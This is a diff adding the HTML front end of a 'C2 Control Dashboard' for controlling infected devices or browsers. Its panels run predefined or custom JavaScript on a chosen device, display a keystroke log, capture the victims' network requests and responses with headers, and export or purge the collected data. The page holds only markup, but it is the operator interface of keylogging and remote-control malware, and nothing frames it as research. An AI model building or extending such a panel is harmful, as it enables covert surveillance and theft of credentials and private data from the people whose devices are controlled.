@@ -1,0 +1,119 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>C2 Control Dashboard</title>
+    <link rel="stylesheet" href="dashboard.css">
+    <!-- Chart.js library for rendering analytics charts -->
+    <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
+</head>
+<body>
+    <div class="app-container">
+        <header class="app-header">
+            <h1>C2 Control Dashboard</h1>
+            <div id="device-stats" class="device-stats">
+                <span>Total: <strong id="stats-total">0</strong></span>
+                <span>Online: <strong id="stats-online">0</strong></span>
+                <span>Offline: <strong id="stats-offline">0</strong></span>
+            </div>
+            <div id="device-selector">
+                <label for="devices">Selected Device:</label>
+                <select id="devices"><option value="">-- Loading Devices --</option></select>
+            </div>
+        </header>
+
+        <main class="main-content">
+            <div class="left-column">
+                <div class="panel command-panel">
+                    <div class="panel-header">
+                        <span class="toggle-icon">▼</span>
+                        <h2>Command & Control</h2>
+                    </div>
+                    <div class="panel-content">
+                        <div class="command-group">
+                            <label for="script-select">Run Pre-defined Script:</label>
+                            <select id="script-select"><option>Loading...</option></select>
+                            <button id="run-script-btn">Run Script</button>
+                        </div>
+                        <div class="command-group">
+                            <label for="custom-script-area">Or, Run Custom Script:</label>
+                            <textarea id="custom-script-area" rows="3" placeholder="return document.title;"></textarea>
+                            <button id="run-custom-btn">Execute</button>
+                        </div>
+                        <div class="command-group admin-actions">
+                            <h3>Admin Actions</h3>
+                            <button id="export-data-btn" class="action-btn">Export All Data</button>
+                            <div id="export-links-container"></div>
+                            <button id="purge-device-btn" class="action-btn danger">Purge This Device</button>
+                        </div>
+                    </div>
+                </div>
+                <div class="panel history-panel">
+                    <div class="tabs">
+                        <button class="tab-button active" data-tab="activity">Activity History</button>
+                        <button class="tab-button" data-tab="keystrokes">Keystroke Log</button>
+                    </div>
+                    <div id="activity" class="tab-content active"><div id="activity-log">Select a device.</div></div>
+                    <div id="keystrokes" class="tab-content"><pre id="keystroke-log">Select a device.</pre></div>
+                </div>
+            </div>
+
+            <div class="panel network-panel">
+                <div class="panel-header-flex">
+                    <h2>Network Traffic</h2>
+                    <button id="show-stats-btn" class="stats-btn">📊 Show Stats</button>
+                </div>
+                <div class="filters">
+                    <select id="methodFilter"><option value="">Any Method</option><option>GET</option><option>POST</option><option>PUT</option><option>DELETE</option><option>OPTIONS</option></select>
+                    <select id="statusFilter"><option value="">Any Status</option><option value="2xx">2xx Success</option><option value="3xx">3xx Redirect</option><option value="4xx">4xx Client Error</option><option value="5xx">5xx Server Error</option></select>
+                    <select id="domainFilter"><option value="">Any Domain</option></select>
+                    <input type="text" id="urlFilter" placeholder="Filter by File Path...">
+                </div>
+                <div class="table-container">
+                    <table id="network-table">
+                        <thead><tr><th>Time</th><th>Method</th><th>Status</th><th>Domain</th><th>File</th></tr></thead>
+                        <tbody><tr><td colspan="5">Select a device.</td></tr></tbody>
+                    </table>
+                </div>
+            </div>
+        </main>
+
+        <!-- Detail Drawer for individual network requests (Original Feature) -->
+        <div id="detail-drawer" class="drawer">
+            <div class="drawer-header"><h3>Request Details</h3><button id="close-drawer-btn">&times;</button></div>
+            <div class="drawer-tabs">
+                <button class="drawer-tab-button active" data-drawer-tab="headers">Headers</button>
+                <button class="drawer-tab-button" data-drawer-tab="response">Response</button>
+                <button class="drawer-tab-button" data-drawer-tab="request">Request</button>
+            </div>
+            <div class="drawer-content">
+                <div id="headers-content" class="drawer-tab-content active"></div>
+                <div id="response-content" class="drawer-tab-content"><pre></pre></div>
+                <div id="request-content" class="drawer-tab-content"><pre></pre></div>
+            </div>
+        </div>
+        <div id="drawer-overlay" class="overlay"></div>
+
+        <!-- Stats Modal for network analytics (New Feature) -->
+        <div id="stats-modal" class="modal hidden">
+            <div class="modal-content">
+                <div class="modal-header">
+                    <h2>Network Traffic Analytics</h2>
+                    <button id="close-stats-modal-btn" class="close-btn">&times;</button>
+                </div>
+                <div class="modal-body">
+                    <div class="chart-grid">
+                        <div class="chart-container"><canvas id="method-chart"></canvas></div>
+                        <div class="chart-container"><canvas id="status-chart"></canvas></div>
+                    </div>
+                </div>
+            </div>
+        </div>
+        <div id="stats-modal-overlay" class="overlay hidden"></div>
+
+        <div id="toast-container"></div>
+    </div>
+    <script src="dashboard.js"></script>
+</body>
+</html>
